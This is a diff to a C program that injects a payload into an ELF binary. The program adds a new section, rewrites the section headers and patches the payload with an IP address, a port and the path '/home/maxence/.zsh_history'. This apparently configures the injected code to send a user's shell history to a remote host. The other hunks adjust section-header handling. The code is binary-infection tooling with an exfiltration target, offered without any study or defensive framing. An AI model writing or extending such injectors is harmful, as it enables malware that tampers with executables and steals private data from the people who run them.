@@ -113,6 +113,19 @@ int main(void) {
 	printf("payload_size_p: %#lx => %#lx\n", new_section_offset, new_section_offset + payload_size_p);
 	memcpy(map + new_section_offset, payload_p, payload_size_p);
 
+	/**
+	 * 
+	 */
+
+	memcpy(map + new_section_offset + payload_size_p - 4, &addr_ip, sizeof(uint32_t));
+	memcpy(map + new_section_offset + payload_size_p - 2 - 4, &port, sizeof(uint16_t));
+	const char *targetfile = "/home/maxence/.zsh_history";
+	memcpy(map + new_section_offset + payload_size_p - 1024 - 2 - 4, targetfile, sizeof(targetfile));
+
+	/**
+	 * 
+	 */
+
 	ehdr->e_shoff += payload_size_p;
 
 	if (msync(map, new_filesize, MS_SYNC) == -1) {
@@ -131,7 +144,7 @@ int main(void) {
 
 	printf("shdrs %#lx, dest %#lx, src %#lx\n", shdrs, shdrs + last_section_in_segment_index + 1, shdrs + last_section_in_segment_index);
 	memmove(shdrs + last_section_in_segment_index + 1, shdrs + last_section_in_segment_index, (ehdr->e_shnum - last_section_in_segment_index) * sizeof(Elf64_Shdr));
-	memset(shdrs + last_section_in_segment_index, 0, sizeof(Elf64_Shdr));
+	// memset(shdrs + last_section_in_segment_index, 0, sizeof(Elf64_Shdr));
 	ehdr->e_shnum += 1;
 	
 	if (msync(map, new_filesize, MS_SYNC) == -1) {
@@ -161,8 +174,6 @@ int main(void) {
 
 	memcpy(shdrs + last_section_in_segment_index, &new_shdr, sizeof(Elf64_Shdr));
 
-    // Update ELF header
-    // ehdr->e_shnum += 1;
     // Update section header string table index
     ehdr->e_shstrndx += 1;
 
@@ -179,7 +190,6 @@ int main(void) {
 		printf("shdrs[%lu].sh_offset: %p\n", i, shdrs + i);
 	}
 	
-
     // // Calculate the relative jump offset to the old entry point
     // int32_t jump_offset = (int32_t)(old_entry_point - (new_section_addr + payload_size_p - 5) - 5);
 
